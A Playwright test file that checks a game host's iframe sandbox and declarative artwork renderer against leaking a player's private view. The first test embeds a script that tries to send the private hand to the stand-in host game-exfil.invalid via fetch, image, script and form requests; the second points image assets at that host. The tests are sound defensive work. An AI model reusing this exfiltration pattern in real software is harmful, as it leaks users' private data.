import fs from 'node:fs';
import path from 'node:path';
import {test, expect} from '@playwright/test';

// Exercise the actual bundled Android host in Chromium. All attempted external
// requests are intercepted locally; this test never contacts an external site.
test('Android game sandbox cannot send a private player view over the network', async ({page}) => {
  const host = 'https://appassets.androidplatform.net/assets/game-host.html';
  const escaped: string[] = [];
  await page.route(host, route => route.fulfill({contentType: 'text/html',
    body: fs.readFileSync(path.resolve(__dirname, '../android/app/src/main/assets/game-host.html'), 'utf8')}));
  await page.route('https://game-exfil.invalid/**', async route => {
    escaped.push(route.request().url());
    await route.fulfill({contentType: 'text/plain', headers: {'Access-Control-Allow-Origin': '*'}, body: 'stolen'});
  });
  await page.addInitScript(() => {
    if (window !== window.top) return;
    (window as any).nativeMessages = [];
    (window as any).PortalNative = {postMessage(value: string) {
      (window as any).nativeMessages.push(JSON.parse(value));
    }};
  });
  await page.goto(host);
  const code = `<!doctype html><script>
    addEventListener('message', async event => {
      if (event.source !== parent || event.data.type !== 'state_changed') return;
      const target = 'https://game-exfil.invalid/' + event.data.state.privateHand;
      let parentReadable = false;
      try { parentReadable = !!parent.document; } catch (_) {}
      const blocked = await Promise.all([
        fetch(target + '/fetch').then(() => false, () => true),
        new Promise(resolve => {
          const image = new Image(); image.onload = () => resolve(false);
          image.onerror = () => resolve(true); image.src = target + '/image';
        }),
        new Promise(resolve => {
          const script = document.createElement('script'); script.onload = () => resolve(false);
          script.onerror = () => resolve(true); script.src = target + '/script'; document.head.append(script);
        }),
      ]);
      const form = document.createElement('form'); form.method = 'POST';
      form.action = target + '/form'; document.body.append(form); form.submit();
      parent.postMessage({type:'make_move', new_state:{blocked, parentReadable,
        nativeBridge:typeof PortalNative}, next_turn_player_indices:[1]}, '*');
    });
    </script>`;
  await page.evaluate(code => (window as any).PortalHost.render({key:'privacy-fixture', code, revision:0,
    message:{type:'state_changed',move_count:0,state:{privateHand:'private-cards'}}}), code);
  await expect.poll(() => page.evaluate(() => (window as any).nativeMessages.filter((message: any) => message.type === 'move')))
    .toEqual([{type:'move',key:'privacy-fixture',expected:0,move:{type:'make_move',
      new_state:{blocked:[true,true,true],parentReadable:false,nativeBridge:'undefined'},next_turn_player_indices:[1]}}]);
  expect(escaped).toEqual([]);
  expect(page.url()).toBe(host);
});

test('stored declarative artwork cannot disclose private scene choices through image requests', async ({page}) => {
  const escaped: string[] = [];
  await page.route('https://game-exfil.invalid/**', async route => {
    escaped.push(route.request().url());
    await route.fulfill({contentType:'image/png',body:''});
  });
  await page.goto('/static/declarative-test.html');
  const applied = await page.evaluate(async () => {
    const container = document.createElement('div'); container.id = 'private-artwork-fixture';
    document.body.append(container);
    // Simulates an older saved package predating the import restriction.
    const host = (window as any).DeclarativeUI.mount(container, {
      format:'buildplay-ui',version:1,viewport:{width:100,height:100},
      boards:[{id:'main',kind:'grid',width:100,height:100,rows:1,columns:1}],
      piece_types:{card:{shape:'image',width:80,height:80}},
      assets:{ace:{uri:'https://game-exfil.invalid/ace.png'},king:{uri:'https://game-exfil.invalid/king.png'}},
      ui_code:"const gameUI={reduce(m){return {scene:{pieces:[{id:'private-card',type:'card',board:'main',position:{cell:'0'},asset:m.view.card}]}}}}",
    });
    return host.send({type:'state_changed',status:'ongoing',view:{card:'ace'},
      my_player_index:0,acting_for_player_index:0,turn_of_player_indices:[0],move_count:0});
  });
  expect(applied).toBe(true);
  await expect(page.locator('#private-artwork-fixture .declarative-piece')).toHaveCount(1);
  await expect(page.locator('#private-artwork-fixture svg image')).toHaveCount(0);
  expect(escaped).toEqual([]);
});
